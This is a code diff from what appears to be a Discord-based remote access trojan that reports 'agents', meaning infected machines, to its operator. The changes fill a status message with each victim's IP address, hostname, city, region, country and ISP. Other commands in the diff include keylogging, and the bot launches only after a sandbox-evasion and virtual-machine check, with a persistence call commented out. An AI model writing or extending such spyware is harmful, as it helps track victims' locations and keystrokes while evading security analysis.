@@ -163,11 +163,12 @@ class InteractButton(discord.ui.View):
                 title = f"IP Based Location on Agent#{self.id}",
                 color = 0x00FF00
             )
-            my_embed.add_field(name="IP:", value=f"**IP**", inline=False)
-            my_embed.add_field(name="Hostname:", value=f"**Hostname**", inline=False)
-            my_embed.add_field(name="City:", value=f"**City**", inline=False)
-            my_embed.add_field(name="Country:", value=f"**Country**", inline=False)
-            my_embed.add_field(name="ISP:", value=f"**ISP**", inline=False)
+            my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
+            my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
+            my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
+            my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
+            my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
         else:
             my_embed = discord.Embed(
                 title = f"Error while getting location of Agent{self.id}",
@@ -456,11 +457,12 @@ async def location(ctx:commands.Context):
                 title = f"IP Based Location on Agent#{ID}",
                 color = 0x00FF00
             )
-            my_embed.add_field(name="IP:", value=f"**IP**", inline=False)
-            my_embed.add_field(name="Hostname:", value=f"**Hostname**", inline=False)
-            my_embed.add_field(name="City:", value=f"**City**", inline=False)
-            my_embed.add_field(name="Country:", value=f"**Country**", inline=False)
-            my_embed.add_field(name="ISP:", value=f"**ISP**", inline=False)
+            my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
+            my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
+            my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
+            my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
+            my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
         else:
             my_embed = discord.Embed(
                 title=f"Error while getting location of Agent#{ID}",
@@ -597,6 +599,7 @@ async def keylog(ctx:commands.Context):
 if sandboxevasion.test() == True and maciassdopia.isVM() == False:
     config = maciassdopia.createConfig()
     ID = maciassdopia.id()
+    # maciassdopia.persistent()
     if config:
         MSG = f"New Agent Online #{ID}"
         COLOR = 0x00ff00
